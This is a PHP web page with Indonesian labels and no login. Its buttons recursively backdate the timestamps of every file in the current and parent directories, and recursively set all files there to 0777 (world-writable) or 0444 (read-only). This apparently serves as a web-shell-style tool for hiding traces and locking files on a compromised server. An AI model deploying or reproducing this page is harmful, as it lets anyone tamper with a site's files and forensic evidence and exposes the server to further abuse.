<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['change_date'])) {
        // Ambil tanggal dan waktu dari input form
        $newDateTime = strtotime($_POST['new_datetime']);

        if ($newDateTime === false) {
            echo "<p style='color: red;'>Format tanggal dan waktu tidak valid!</p>";
        } else {
            // Fungsi rekursif untuk mengubah tanggal dan waktu
            function changeDateTimeRecursively($dir, $newDateTime) {
                $files = scandir($dir);

                foreach ($files as $file) {
                    if ($file !== '.' && $file !== '..') {
                        $path = $dir . DIRECTORY_SEPARATOR . $file;

                        // Ubah tanggal dan waktu file
                        touch($path, $newDateTime);

                        // Jika direktori, rekursif
                        if (is_dir($path)) {
                            changeDateTimeRecursively($path, $newDateTime);
                        }
                    }
                }
            }

            // Jalankan fungsi, mulai dari direktori saat ini
            changeDateTimeRecursively('.', $newDateTime);

            echo "<p style='color: green;'>Done! Semua file dan direktori telah diubah tanggal dan waktunya.</p>";
        }
    }

    if (isset($_POST['change_permissions_full'])) {
        // Script untuk mengubah izin akses ke full access (0777)
        function changePermissionsRecursively($dir, $permission) {
            $files = scandir($dir);

            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;

                    // Ubah izin akses file/folder
                    chmod($path, $permission);

                    // Jika direktori, rekursif
                    if (is_dir($path)) {
                        changePermissionsRecursively($path, $permission);
                    }
                }
            }

            // Ubah izin akses untuk direktori saat ini
            chmod($dir, $permission);
        }

        // Tentukan izin akses yang diinginkan (0777 untuk full access)
        $permission = 0777;

        // Jalankan fungsi, mulai dari direktori saat ini
        changePermissionsRecursively('.', $permission);

        echo "<p style='color: green;'>Done! Izin akses semua file dan direktori telah diubah ke full access (0777).</p>";
    }

    if (isset($_POST['change_permissions_deny'])) {
        // Script untuk mengubah izin akses menjadi tidak diizinkan (0444)
        function changePermissionsRecursively($dir, $permission) {
            $files = scandir($dir);

            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;

                    // Ubah izin akses file/folder
                    chmod($path, $permission);

                    // Jika direktori, rekursif
                    if (is_dir($path)) {
                        changePermissionsRecursively($path, $permission);
                    }
                }
            }

            // Ubah izin akses untuk direktori saat ini
            chmod($dir, $permission);
        }

        // Tentukan izin akses yang diinginkan (0444 untuk tidak diizinkan)
        $permission = 0444;

        // Jalankan fungsi, mulai dari direktori saat ini
        changePermissionsRecursively('.', $permission);

        echo "<p style='color: green;'>Done! Izin akses semua file dan direktori telah diubah menjadi tidak diizinkan (0444).</p>";
    }

    // Tombol baru: Ubah izin akses di direktori lain (misalnya, direktori parent)
    if (isset($_POST['change_permissions_full_other'])) {
        function changePermissionsRecursively($dir, $permission) {
            $files = scandir($dir);

            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;

                    // Ubah izin akses file/folder
                    chmod($path, $permission);

                    // Jika direktori, rekursif
                    if (is_dir($path)) {
                        changePermissionsRecursively($path, $permission);
                    }
                }
            }
        }

        // Tentukan izin akses yang diinginkan (0777 untuk full access)
        $permission = 0777;

        // Jalankan fungsi, mulai dari direktori lain (misalnya, direktori parent)
        $otherDir = '..'; // Ubah path ini sesuai kebutuhan
        changePermissionsRecursively($otherDir, $permission);

        echo "<p style='color: green;'>Done! Izin akses semua file dan direktori di direktori lain telah diubah ke full access (0777).</p>";
    }

    if (isset($_POST['change_permissions_deny_other'])) {
        function changePermissionsRecursively($dir, $permission) {
            $files = scandir($dir);

            foreach ($files as $file) {
                if ($file !== '.' && $file !== '..') {
                    $path = $dir . DIRECTORY_SEPARATOR . $file;

                    // Ubah izin akses file/folder
                    chmod($path, $permission);

                    // Jika direktori, rekursif
                    if (is_dir($path)) {
                        changePermissionsRecursively($path, $permission);
                    }
                }
            }
        }

        // Tentukan izin akses yang diinginkan (0444 untuk tidak diizinkan)
        $permission = 0444;

        // Jalankan fungsi, mulai dari direktori lain (misalnya, direktori parent)
        $otherDir = '..'; // Ubah path ini sesuai kebutuhan
        changePermissionsRecursively($otherDir, $permission);

        echo "<p style='color: green;'>Done! Izin akses semua file dan direktori di direktori lain telah diubah menjadi tidak diizinkan (0444).</p>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ubah Tanggal dan Izin Akses</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        h1, h2 {
            color: #333;
        }
        form {
            margin-top: 20px;
        }
        label {
            display: block;
            margin-bottom: 10px;
        }
        input[type="datetime-local"] {
            padding: 5px;
            font-size: 16px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            margin-right: 10px;
            margin-top: 10px;
            cursor: pointer;
        }
        hr {
            margin: 20px 0;
            border: 0;
            border-top: 1px solid #ccc;
        }
    </style>
</head>
<body>
    <h1>Ubah Tanggal dan Izin Akses</h1>
    <form action="" method="POST">
        <h2>Ubah Tanggal dan Waktu</h2>
        <label for="new_datetime">Pilih Tanggal dan Waktu:</label>
        <input type="datetime-local" id="new_datetime" name="new_datetime" value="2025-02-15T01:56" required>
        <button type="submit" name="change_date">Ubah Tanggal dan Waktu</button>

        <hr>

        <h2>Ubah Izin Akses</h2>
        <button type="submit" name="change_permissions_full">Ubah Izin (0777)</button>
        <button type="submit" name="change_permissions_deny">Ubah Izin (0444)</button>

        <hr>

        <h2>Ubah Izin di Direktori Lain</h2>
        <button type="submit" name="change_permissions_full_other">Ubah Izin (0777) di Direktori Lain</button>
        <button type="submit" name="change_permissions_deny_other">Ubah Izin (0444) di Direktori Lain</button>
    </form>
</body>
</html>